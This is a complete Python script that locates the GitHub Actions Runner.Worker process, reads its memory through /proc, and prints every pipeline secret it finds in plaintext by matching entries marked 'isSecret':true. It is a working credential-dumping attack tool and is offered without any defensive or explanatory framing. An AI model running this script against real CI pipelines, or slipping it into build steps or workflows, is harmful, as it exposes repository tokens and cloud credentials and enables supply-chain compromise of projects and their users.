import sys
import os
import re

# Credit to github.com/nikitastupin for the script.

def get_pid():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmdline_f:
            if b'Runner.Worker' in cmdline_f.read():
                return pid

    raise Exception('Can not get pid of Runner.Worker')

pid = get_pid()

map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"

with open(map_path, 'r') as map_f, open(mem_path, 'rb', 0) as mem_f:
    for line in map_f.readlines():  # for each mapped region
        m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
        if m.group(3) == 'r':  # readable region
            start = int(m.group(1), 16)
            end = int(m.group(2), 16)
            if start > sys.maxsize:
                continue
            mem_f.seek(start)  # seek to region start
        
            try:
                chunk = mem_f.read(end - start)  # read region contents
                # sys.stdout.buffer.write(chunk)

                # 2. Simulate 'grep -aoE "..."': Find and print all non-overlapping matches
                # The regex looks for:
                # 1. A key enclosed in double quotes (e.g., "MY_VAR")
                # 2. Followed by a colon and the start of an object: :\{
                # 3. Containing the literal string "value":"..."
                # 4. Containing the literal string "isSecret":true\}
                # The pattern matches the entire key-value block.
                # The '?' makes the middle part non-greedy.
                
                # Regex equivalent of: '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
                regex_pattern = r'"[^"]+":\{"value":"[^"]*","isSecret":true\}'

                # Find all non-overlapping matches
                matches = re.findall(regex_pattern, chunk.decode('utf-8') )

                # Print each match on a new line, similar to grep's -o flag
                for match in matches:
                    print(match)
                    
            except OSError:
                continue